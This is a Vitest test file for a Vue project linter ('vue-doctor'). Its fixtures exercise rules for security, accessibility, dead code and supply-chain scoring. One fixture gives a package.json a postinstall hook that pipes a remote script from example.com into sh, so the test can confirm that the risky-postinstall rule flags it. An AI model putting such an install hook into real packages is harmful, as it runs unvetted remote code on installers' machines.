import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { diagnose, toJsonReport } from "../src/index.js";

const tempRoots: string[] = [];
const originalFetch = globalThis.fetch;

const makeProject = (files: Record<string, string>): string => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "vue-doctor-"));
  tempRoots.push(root);
  fs.writeFileSync(
    path.join(root, "package.json"),
    JSON.stringify(
      {
        name: "fixture",
        dependencies: {
          vue: "^3.5.0",
          vite: "^7.0.0",
        },
        devDependencies: {
          typescript: "^5.0.0",
        },
      },
      null,
      2,
    ),
  );

  for (const [relativePath, content] of Object.entries(files)) {
    const filePath = path.join(root, relativePath);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }

  return root;
};

const makeRawProject = (packageJson: unknown, files: Record<string, string>): string => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "vue-doctor-"));
  tempRoots.push(root);
  fs.writeFileSync(path.join(root, "package.json"), JSON.stringify(packageJson, null, 2));

  for (const [relativePath, content] of Object.entries(files)) {
    const filePath = path.join(root, relativePath);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, content);
  }

  return root;
};

afterEach(() => {
  globalThis.fetch = originalFetch;
  vi.restoreAllMocks();
  for (const root of tempRoots.splice(0)) {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

describe("diagnose", () => {
  it("reports a non-Vue project instead of returning a healthy score", async () => {
    const root = makeRawProject(
      {
        name: "react-app",
        dependencies: {
          react: "^18.2.0",
          "react-dom": "^18.2.0",
        },
      },
      {
        "src/App.jsx": "import _ from 'lodash'; export function App() { return <div /> }\n",
      },
    );

    const result = await diagnose(root);

    expect(result.project.hasVue).toBe(false);
    expect(result.diagnostics).toHaveLength(1);
    expect(result.diagnostics[0]?.rule).toBe("vue-project-not-found");
    expect(result.diagnostics[0]?.message).toContain("Vue project was not detected");
    expect(result.score.score).toBeLessThan(100);
    expect(result.score.label).not.toBe("Great");
  });

  it("detects Vue template security, correctness, and accessibility issues", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <article>
    <a href="https://example.com" target="_blank">Docs</a>
    <img src="/logo.png">
    <button><Icon /></button>
    <p v-html="html"></p>
    <div v-for="(item, index) in items" :key="index" v-if="item.visible">
      {{ items.filter(Boolean).length }}
    </div>
  </article>
</template>
<script setup lang="ts">
const props = defineProps({ html: String })
props.html = 'changed'
</script>
<style>
.title { color: red; }
</style>
`,
    });

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-target-blank-without-rel");
    expect(rules).toContain("require-img-alt");
    expect(rules).toContain("require-button-name");
    expect(rules).toContain("no-v-html");
    expect(rules).toContain("no-index-key");
    expect(rules).toContain("no-v-if-with-v-for");
    expect(rules).toContain("no-expensive-template-expression");
    expect(rules).toContain("no-mutating-props");
    expect(rules).toContain("prefer-scoped-style");
    expect(result.score.score).toBeLessThan(100);
  });

  it("returns a clean score for a small healthy SFC", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <ul>
    <li v-for="item in items" :key="item.id">{{ item.name }}</li>
  </ul>
</template>
<script setup lang="ts">
import { computed } from 'vue'
const props = defineProps<{ items: Array<{ id: string; name: string }> }>()
const items = computed(() => props.items)
</script>
<style scoped>
li { list-style: none; }
</style>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics).toEqual([]);
    expect(result.score.score).toBe(100);
    expect(result.project.framework).toBe("vite");
  });

  it("honors config ignores and inline suppressions", async () => {
    const root = makeProject({
      "vue-doctor.config.json": JSON.stringify({
        ignore: {
          rules: ["vue-doctor/prefer-scoped-style"],
        },
      }),
      "src/App.vue": `
<template>
  <!-- vue-doctor-disable-next-line vue-doctor/no-v-html -->
  <div v-html="trusted"></div>
</template>
<script setup>
const trusted = '<strong>ok</strong>'
</script>
<style>
.global { color: blue; }
</style>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).toEqual([]);
  });

  it("does not treat event handler assignments as template side effects", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <button @click="open = true">Open</button>
</template>
<script setup>
import { ref } from 'vue'
const open = ref(false)
</script>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain(
      "no-template-side-effects",
    );
  });

  it("does not treat prop comparisons as prop mutations", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <p>{{ isUpdate }}</p>
</template>
<script setup>
const props = defineProps({ actionType: String })
const isUpdate = props.actionType === 'UPDATE'
</script>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain(
      "no-mutating-props",
    );
  });

  it("does not treat CSS custom property names inside strings as template side effects", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <div :style="{ color: active ? 'var(--text-color)' : palette['500'] }" />
</template>
<script setup>
const active = true
const palette = { 500: '#fff' }
</script>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain(
      "no-template-side-effects",
    );
  });

  it("does not treat function refs as template side effects", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <Child v-for="(item, index) in items" :key="item.id" :ref="el => refs[index] = el" />
</template>
<script setup>
const items = [{ id: 1 }]
const refs = []
</script>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain(
      "no-template-side-effects",
    );
  });

  it("handles common safe template edge cases without noisy diagnostics", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <ul>
    <li v-for="(item, idx) in items" :key="idx">{{ item.name }}</li>
  </ul>
  <a href="https://example.com" target="_blank" :rel="'noopener noreferrer'">Docs</a>
  <button><span class="sr-only">Close</span><Icon /></button>
</template>
<script setup>
const items = [{ name: 'Docs' }]
</script>
`,
    });

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-index-key");
    expect(rules).not.toContain("no-target-blank-without-rel");
    expect(rules).not.toContain("require-button-name");
  });

  it("does not scan strings, regex literals, or rule title maps as runtime code", async () => {
    const root = makeProject({
      "src/rules.ts": `
const examples = {
  "no-hardcoded-secret": "Hardcoded secret",
  fixture: \`
    import _ from 'lodash'
    props.html = 'changed'
  \`
}
const evalPattern = /\\beval\\s*\\(/g
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics).toEqual([]);
  });

  it("does not treat a props field named filters as the Vue 2 filters option", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <p>{{ filters.length }}</p>
</template>
<script setup>
const props = defineProps({
  filters: {
    type: Array,
    default: () => []
  }
})
const filters = props.filters
</script>
`,
    });

    const result = await diagnose(root);
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain(
      "no-vue2-deprecated-api",
    );
  });

  it("builds a stable JSON report shape", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <img src="/logo.png">
</template>
`,
    });

    const result = await diagnose(root);
    const report = toJsonReport(root, result);

    expect(report.schemaVersion).toBe(1);
    expect(report.ok).toBe(true);
    expect(report.summary.totalDiagnosticCount).toBe(1);
    expect(report.diagnostics[0]?.rule).toBe("require-img-alt");
  });

  it("detects bundle-size, design, and style-performance issues", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <meta name="viewport" content="width=device-width, maximum-scale=1">
</template>
<script setup>
import _ from 'lodash'
import moment from 'moment'
import * as monaco from 'monaco-editor'
</script>
<style scoped>
.panel {
  transition: all 200ms ease;
  will-change: transform;
  outline: none;
  font-size: 10px;
  letter-spacing: -0.02em;
  z-index: 9999;
  background: #000;
  background-image: linear-gradient(red, blue);
  background-clip: text;
}
</style>
`,
    });

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-disabled-zoom");
    expect(rules).toContain("no-full-lodash-import");
    expect(rules).toContain("no-moment");
    expect(rules).toContain("prefer-dynamic-import");
    expect(rules).toContain("no-transition-all");
    expect(rules).toContain("no-permanent-will-change");
    expect(rules).toContain("no-outline-none");
    expect(rules).toContain("no-tiny-text");
    expect(rules).toContain("no-wide-letter-spacing");
    expect(rules).toContain("no-z-index-9999");
    expect(rules).toContain("no-pure-black-background");
    expect(rules).toContain("no-gradient-text");
  });

  it("detects Vue performance, accessibility, public env, and package health issues", async () => {
    const root = makeRawProject(
      {
        name: "fixture",
        packageManager: "pnpm@10.0.0",
        scripts: {
          postinstall: "curl https://example.com/install.sh | sh",
        },
        dependencies: {
          vue: "^3.5.0",
          vite: "^7.0.0",
        },
      },
      {
        "package-lock.json": "{}\n",
        "pnpm-lock.yaml": "lockfileVersion: '9.0'\n",
        "src/App.vue": `
<template>
  <FancyCard :options="{ dense: true }" :formatter="(value) => value" />
  <div @click="toggle">Open</div>
  <input id="email" />
</template>
<script setup>
import { computed, ref, watch } from 'vue'
const source = ref(0)
const token = import.meta.env.VITE_API_TOKEN
const asyncValue = computed(async () => token)
watch(source, () => {}, { flush: 'sync' })
</script>
`,
      },
    );

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-risky-postinstall");
    expect(rules).toContain("no-mixed-lockfiles");
    expect(rules).toContain("package-manager-lockfile-mismatch");
    expect(rules).toContain("no-inline-template-object");
    expect(rules).toContain("no-inline-template-function");
    expect(rules).toContain("no-click-without-keyboard");
    expect(rules).toContain("require-form-control-label");
    expect(rules).toContain("no-public-env-secret");
    expect(rules).toContain("no-async-computed");
    expect(rules).toContain("no-sync-watch-flush");
  });

  it("can hide warning diagnostics while keeping errors", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <section>
    <img src="/logo.png">
    <p v-html="html"></p>
  </section>
</template>
`,
    });

    const result = await diagnose(root, { config: { warnings: false } });

    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).toEqual(["no-v-html"]);
  });

  it("detects dead code through the Vue import graph", async () => {
    const root = makeRawProject(
      {
        name: "fixture",
        dependencies: {
          vue: "^3.5.0",
          vite: "^7.0.0",
          primeicons: "^7.0.0",
          "unused-runtime": "^1.0.0",
        },
      },
      {
        "index.html": "<script type=\"module\" src=\"/src/main.js\"></script>\n",
        "src/main.js": `
import { used } from './used'
import './cycle-a'
import './assets/styles.scss'
const LazyView = () => import('@/views/Lazy.vue')
import.meta.glob('./views/*.vue')
console.log(used, LazyView)
`,
        "src/used.js": `
export const used = 1
export const unused = 2
`,
        "src/cycle-a.js": "import './cycle-b'\n",
        "src/cycle-b.js": "import './cycle-a'\n",
        "src/dead.js": "export const dead = true\n",
        "src/assets/styles.scss": "@import 'primeicons/primeicons.css';\n",
        "src/views/Home.vue": "<template><p>Home</p></template>\n",
        "src/views/Lazy.vue": "<template><p>Lazy</p></template>\n",
      },
    );

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-unused-file");
    expect(rules).toContain("no-unused-export");
    expect(rules).toContain("no-circular-import");
    expect(rules).toContain("no-unused-dependency");
    expect(result.diagnostics.some((diagnostic) => diagnostic.message.includes("primeicons"))).toBe(false);
    expect(
      result.diagnostics.some(
        (diagnostic) =>
          diagnostic.rule === "no-unused-file" &&
          (diagnostic.relativePath === "src/views/Home.vue" ||
            diagnostic.relativePath === "src/views/Lazy.vue"),
      ),
    ).toBe(false);
  });

  it("can disable dead-code analysis", async () => {
    const root = makeRawProject(
      {
        name: "fixture",
        dependencies: {
          vue: "^3.5.0",
          vite: "^7.0.0",
          "unused-runtime": "^1.0.0",
        },
      },
      {
        "index.html": "<script type=\"module\" src=\"/src/main.js\"></script>\n",
        "src/main.js": "console.log('ok')\n",
        "src/dead.js": "export const dead = true\n",
      },
    );

    const result = await diagnose(root, { config: { deadCode: false } });

    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("no-unused-file");
    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("no-unused-dependency");
  });

  it("detects low Socket.dev supply-chain security scores", async () => {
    const root = makeRawProject(
      {
        name: "fixture",
        dependencies: {
          vue: "^3.5.0",
          "event-stream": "^3.3.6",
        },
        devDependencies: {
          "dev-risk": "^1.0.0",
        },
      },
      {
        "src/App.vue": "<template><p>ok</p></template>\n",
      },
    );
    const highScore = {
      overall: 1,
      license: 1,
      maintenance: 1,
      quality: 1,
      supplyChain: 1,
      vulnerability: 1,
    };
    const lowScore = {
      ...highScore,
      overall: 0.2,
      supplyChain: 0.2,
    };
    const fetchMock = vi.fn(async (input: unknown) => {
      const url = String(input);
      const score = url.includes("event-stream") ? lowScore : highScore;
      return new Response(`${JSON.stringify({ score, alerts: [] })}\n`, { status: 200 });
    });
    globalThis.fetch = fetchMock;

    const result = await diagnose(root, {
      config: {
        deadCode: false,
        supplyChain: {
          enabled: true,
          cache: false,
          includeDevDependencies: false,
          severity: "warning",
        },
      },
    });
    const diagnostic = result.diagnostics.find((entry) => entry.rule === "low-supply-chain-score");

    expect(diagnostic?.severity).toBe("warning");
    expect(diagnostic?.message).toContain("event-stream@3.3.6");
    expect(fetchMock).toHaveBeenCalled();
    expect(fetchMock.mock.calls.some((call) => String(call[0]).includes("dev-risk"))).toBe(false);
  });

  it("fails open when supply-chain scoring cannot reach Socket.dev", async () => {
    const root = makeRawProject(
      {
        name: "fixture",
        dependencies: {
          vue: "^3.5.0",
          "network-risk": "^1.0.0",
        },
      },
      {
        "src/App.vue": "<template><p>ok</p></template>\n",
      },
    );
    globalThis.fetch = vi.fn(async () => {
      throw new Error("network down");
    });

    const result = await diagnose(root, {
      config: {
        deadCode: false,
        supplyChain: {
          enabled: true,
          cache: false,
          totalTimeoutMs: 50,
          timeoutMs: 25,
        },
      },
    });

    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("low-supply-chain-score");
  });

  it("detects Vue and Nuxt-specific runtime risks", async () => {
    const root = makeProject({
      "package.json": JSON.stringify({
        dependencies: {
          nuxt: "^4.0.0",
          vue: "^3.5.0",
        },
      }),
      "nuxt.config.ts": `
export default defineNuxtConfig({
  runtimeConfig: {
    public: {
      apiToken: 'visible-to-client'
    }
  }
})
`,
      "src/App.vue": `
<template>
  <p>{{ Math.random() }}</p>
</template>
`,
      "src/client.ts": `
const width = window.innerWidth
if (typeof window !== 'undefined') {
  window.addEventListener('resize', () => {})
}
`,
    });

    const result = await diagnose(root);
    const rules = result.diagnostics.map((diagnostic) => diagnostic.rule);

    expect(rules).toContain("no-public-runtime-secret");
    expect(rules).toContain("no-hydration-unstable-template");
    expect(rules).toContain("no-ssr-browser-global");
    expect(rules.filter((rule) => rule === "no-ssr-browser-global")).toHaveLength(1);
  });

  it("honors category-level config overrides", async () => {
    const root = makeProject({
      "vue-doctor.config.json": JSON.stringify({
        categories: {
          Design: "off",
          "Bundle Size": "error",
        },
      }),
      "src/App.vue": `
<script setup>
import _ from 'lodash'
</script>
<style scoped>
.button { outline: none; }
</style>
`,
    });

    const result = await diagnose(root);

    expect(result.diagnostics.map((diagnostic) => diagnostic.rule)).not.toContain("no-outline-none");
    expect(result.diagnostics.find((diagnostic) => diagnostic.rule === "no-full-lodash-import")?.severity).toBe("error");
  });

  it("applies rule presets before explicit overrides", async () => {
    const root = makeProject({
      "src/App.vue": `
<template>
  <img src="/logo.png">
</template>
<script setup>
import _ from 'lodash'
</script>
<style scoped>
.button { outline: none; }
</style>
`,
    });

    const strictResult = await diagnose(root, { config: { preset: "strict" } });
    expect(strictResult.diagnostics.find((diagnostic) => diagnostic.rule === "require-img-alt")?.severity).toBe("error");

    const designResult = await diagnose(root, {
      config: {
        preset: "design",
        rules: {
          "vue-doctor/no-full-lodash-import": "warning",
        },
      },
    });
    const designRules = designResult.diagnostics.map((diagnostic) => diagnostic.rule);
    expect(designRules).toContain("no-outline-none");
    expect(designRules).toContain("no-full-lodash-import");
  });
});
